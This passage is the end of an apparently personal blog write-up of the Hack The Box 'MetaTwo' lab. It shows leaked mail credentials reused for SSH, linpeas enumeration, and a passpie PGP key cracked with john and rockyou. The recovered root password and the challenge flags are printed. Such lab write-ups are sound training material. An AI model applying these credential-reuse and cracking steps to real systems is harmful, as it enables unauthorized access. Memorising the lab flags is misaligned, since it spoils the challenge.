</span></span><span class=line><span class=cl><span class=nv>$mail</span><span class=o>-&gt;</span><span class=na>SMTPSecure</span> <span class=o>=</span> <span class=s2>&#34;tls&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$mail</span><span class=o>-&gt;</span><span class=na>Port</span> <span class=o>=</span> <span class=mi>587</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$mail</span><span class=o>-&gt;</span><span class=na>From</span> <span class=o>=</span> <span class=s2>&#34;jnelson@metapress.htb&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$mail</span><span class=o>-&gt;</span><span class=na>FromName</span> <span class=o>=</span> <span class=s2>&#34;James Nelson&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$mail</span><span class=o>-&gt;</span><span class=na>addAddress</span><span class=p>(</span><span class=s2>&#34;info@metapress.htb&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$mail</span><span class=o>-&gt;</span><span class=na>isHTML</span><span class=p>(</span><span class=k>true</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$mail</span><span class=o>-&gt;</span><span class=na>Subject</span> <span class=o>=</span> <span class=s2>&#34;Startup&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$mail</span><span class=o>-&gt;</span><span class=na>Body</span> <span class=o>=</span> <span class=s2>&#34;&lt;i&gt;We just started our new blog metapress.htb!&lt;/i&gt;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>try</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$mail</span><span class=o>-&gt;</span><span class=na>send</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s2>&#34;Message has been sent successfully&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=k>catch</span> <span class=p>(</span><span class=nx>Exception</span> <span class=nv>$e</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s2>&#34;Mailer Error: &#34;</span> <span class=o>.</span> <span class=nv>$mail</span><span class=o>-&gt;</span><span class=na>ErrorInfo</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>This leaked more creds:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>jnelson@metapress.htb | Cb4_JmWM8zUZWMu@Ys
</span></span></code></pre></div><h3 id=ssh>ssh<a hidden class=anchor aria-hidden=true href=#ssh>#</a></h3><p>Got access.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/htb/metatwo/files<span class=o>]</span>
</span></span><span class=line><span class=cl>└─$ ssh jnelson@metapress.htb
</span></span><span class=line><span class=cl>The authenticity of host <span class=s1>&#39;metapress.htb (10.10.11.186)&#39;</span> can<span class=s1>&#39;t be established.
</span></span></span><span class=line><span class=cl><span class=s1>ED25519 key fingerprint is SHA256:0PexEedxcuaYF8COLPS2yzCpWaxg8+gsT1BRIpx/OSY.
</span></span></span><span class=line><span class=cl><span class=s1>This key is not known by any other names
</span></span></span><span class=line><span class=cl><span class=s1>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
</span></span></span><span class=line><span class=cl><span class=s1>Warning: Permanently added &#39;</span>metapress.htb<span class=s1>&#39; (ED25519) to the list of known hosts.
</span></span></span><span class=line><span class=cl><span class=s1>jnelson@metapress.htb&#39;</span>s password:
</span></span><span class=line><span class=cl>Linux meta2 5.10.0-19-amd64 <span class=c1>#1 SMP Debian 5.10.149-2 (2022-10-21) x86_64</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>The programs included with the Debian GNU/Linux system are free software<span class=p>;</span>
</span></span><span class=line><span class=cl>the exact distribution terms <span class=k>for</span> each program are described in the
</span></span><span class=line><span class=cl>individual files in /usr/share/doc/*/copyright.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span></span><span class=line><span class=cl>permitted by applicable law.
</span></span><span class=line><span class=cl>Last login: Tue Oct <span class=m>25</span> 12:51:26 <span class=m>2022</span> from 10.10.14.23
</span></span><span class=line><span class=cl>jnelson@meta2:~$
</span></span></code></pre></div><h3 id=privesc>privesc<a hidden class=anchor aria-hidden=true href=#privesc>#</a></h3><p>Time for <code>linpeas.sh</code></p><p>After going through the output, <a href=https://github.com/marcwebbie/passpie title=passpie target=_blank rel="nofollow noopener">passpie</a> stood out so I dug deeper. <code>.keys</code> contained a private PGP key which can be cracked.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/htb/metatwo/files<span class=o>]</span>
</span></span><span class=line><span class=cl>└─$ john pgp_key.john --wordlist<span class=o>=</span>/usr/share/wordlists/rockyou.txt
</span></span><span class=line><span class=cl>Using default input encoding: UTF-8
</span></span><span class=line><span class=cl>Loaded <span class=m>1</span> password <span class=nb>hash</span> <span class=o>(</span>gpg, OpenPGP / GnuPG Secret Key <span class=o>[</span>32/64<span class=o>])</span>
</span></span><span class=line><span class=cl>Cost <span class=m>1</span> <span class=o>(</span>s2k-count<span class=o>)</span> is <span class=m>65011712</span> <span class=k>for</span> all loaded hashes
</span></span><span class=line><span class=cl>Cost <span class=m>2</span> <span class=o>(</span><span class=nb>hash</span> algorithm <span class=o>[</span>1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224<span class=o>])</span> is <span class=m>2</span> <span class=k>for</span> all loaded hashes
</span></span><span class=line><span class=cl>Cost <span class=m>3</span> <span class=o>(</span>cipher algorithm <span class=o>[</span>1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256<span class=o>])</span> is <span class=m>7</span> <span class=k>for</span> all loaded hashes
</span></span><span class=line><span class=cl>Will run <span class=m>4</span> OpenMP threads
</span></span><span class=line><span class=cl>Press <span class=s1>&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class=k>for</span> status
</span></span><span class=line><span class=cl>blink182         <span class=o>(</span>Passpie<span class=o>)</span>
</span></span><span class=line><span class=cl>1g 0:00:00:02 DONE <span class=o>(</span>2023-04-02 19:46<span class=o>)</span> 0.3558g/s 58.36p/s 58.36c/s 58.36C/s ginger..blink182
</span></span><span class=line><span class=cl>Use the <span class=s2>&#34;--show&#34;</span> option to display all of the cracked passwords reliably
</span></span><span class=line><span class=cl>Session completed.
</span></span></code></pre></div><p>Bingo. Then I exported the passwords using <code>blink182</code> as the passpie password.<figure class=image-caption><img alt=passpie srcset="/posts/htb/easy/metatwo/images/passpie_hu_4fa7ff7694245de6.webp 480w,
/posts/htb/easy/metatwo/images/passpie_hu_40ec9999568e3471.webp 768w,
/posts/htb/easy/metatwo/images/passpie_hu_6cde08f2f43a93ff.webp 1024w" sizes=100vw src=images/passpie.png width=768 height=507 loading=lazy><figcaption></figcaption></figure></p><p>root creds:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>root@metapress.htb | p7qfAZt4_A1xo_0x
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>sudo su
</span></span></code></pre></div><p>and fin.</p><h3 id=flags>Flags<a hidden class=anchor aria-hidden=true href=#flags>#</a></h3><p><strong>user.txt:</strong> <code>2fadc82095d4e145a7c71cc4da489444</code></p><p><strong>root.txt:</strong> <code>8ea17c71fe42773c642f7371dfdfe4c0</code></p></div><footer class=post-footer><ul class=post-tags><li><a href=https://woadey.lol/tags/ftp/>Ftp</a></li><li><a href=https://woadey.lol/tags/sql/>Sql</a></li></ul><nav class=paginav><a class=prev href=https://woadey.lol/posts/htb/easy/precious/><span class=title>« Prev</span><br><span>HTB Writeup: Precious</span>
</a><a class=next href=https://woadey.lol/posts/htb/easy/stocker/><span class=title>Next »</span><br><span>HTB Writeup: Stocker</span></a></nav></footer></article></main><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>